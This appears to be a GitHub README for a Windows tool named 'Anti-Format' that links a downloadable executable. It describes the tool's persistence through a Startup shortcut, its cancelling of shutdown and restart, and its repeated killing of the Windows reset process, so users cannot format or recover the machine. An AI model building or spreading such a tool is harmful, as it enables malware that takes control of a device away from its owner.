## [DOWNLOAD](https://github.com/MasonGroup/Anti-Format/raw/main/Anti-Format/bin/Debug/Anti-Format.exe)
## **Main Method**
Registers an event handler for the SessionEnding event. This event occurs when the user tries to end the current session, such as when attempting to shut down or restart the system.
Creates a shortcut to the program in the Startup folder to ensure that it runs automatically when the system starts.
Enters an infinite loop to continuously monitor and take action against the target process.

## **SystemEvents_SessionEnding Method**
This method is called when a session ending event is detected.
It cancels the session ending event, effectively preventing the action (such as shutdown or restart) from occurring.

## **CreateShortcutInStartup Method**
Creates a shortcut to the program and places it in the Startup folder.
It checks if the shortcut already exists and creates a new one if it doesn't.
The shortcut ensures that the program runs automatically when the system starts.

## **Loop**
Inside the loop, the program continuously searches for the target process named "SystemSettingsAdminFlows".
If the process is found, it is terminated using the Kill method, and a message is displayed indicating that the process was killed.
After performing this action, the program waits for 5 seconds before repeating the process. This delay prevents excessive CPU usage.
```sh
"We hereby declare that we disclaim any liability for any improper use of the software. Thank you for your understanding."
```
----
